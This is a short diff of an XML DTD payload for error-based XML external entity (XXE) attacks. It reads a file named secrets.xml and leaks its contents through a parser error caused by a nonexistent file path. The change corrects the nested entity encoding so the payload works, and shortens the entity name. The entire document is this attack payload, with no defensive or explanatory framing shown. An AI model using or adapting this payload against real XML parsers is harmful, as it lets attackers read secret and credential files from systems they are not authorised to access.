@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file:///secrets.xml">
-<!ENTITY % eval "<!ENTITY % exfiltrate SYSTEM 'file:///nonexistent/%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///nonexistent/%file;'>">
 %eval;
-%exfiltrate;
+%exfil;
